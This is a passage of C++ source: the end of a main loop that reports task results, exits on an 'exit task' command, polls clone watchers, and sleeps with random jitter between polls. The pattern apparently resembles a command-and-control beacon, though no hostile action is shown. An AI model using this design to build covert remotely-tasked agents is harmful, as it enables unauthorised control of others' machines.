                        report_result(task_id, output, exit_code);
                        if (should_exit) {
                            logmsg("exit task received — shutting down");
                            curl_global_cleanup();
                            return 0;
                        }

                        pos = obj_end;
                    }
                }
            }
        }

        /* poll any due clone watchers */
        {
            std::vector<std::string> due;
            long now = (long)time(nullptr);
            {
                std::lock_guard<std::mutex> lock(g_clones_mutex);
                for (auto &kv : g_clones) {
                    if (now >= kv.second.next_check) due.push_back(kv.first);
                }
            }
            for (const auto &t : due) clone_watch(t);
        }

        int delay = g_interval;
        if (g_jitter > 0) delay += rand() % (g_jitter + 1);
        sleep(delay);
    }

    curl_global_cleanup();
    return 0;
}
